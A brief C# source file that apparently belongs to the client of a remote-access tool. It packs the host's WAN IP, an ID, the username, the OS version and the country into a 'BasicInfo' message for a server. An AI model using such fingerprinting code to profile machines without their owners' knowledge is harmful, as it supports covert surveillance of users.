using Client.Handlers;
using Microsoft.VisualBasic.Devices;
using PacketLib;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Client.Utils
{
    internal class BasicInfo
    {
        public byte[] Get() 
        {
            GeoInfo.Get();
            MsgPack msgPack = new MsgPack();
            msgPack.Set("Packet", "BasicInfo");
            msgPack.Set("IP", GeoInfo.WanIpAddress);
            msgPack.Set("UID", UID.Get());
            msgPack.Set("Username", Environment.UserName);
            msgPack.Set("Os", (new ComputerInfo().OSFullName.ToString().Replace("Microsoft", null) + " " +
                Environment.Is64BitOperatingSystem.ToString().Replace("True", "64bit").Replace("False", "32bit")).Trim());
            msgPack.Set("Country", GeoInfo.Country);
            return msgPack.Pack();
        }
    }
}
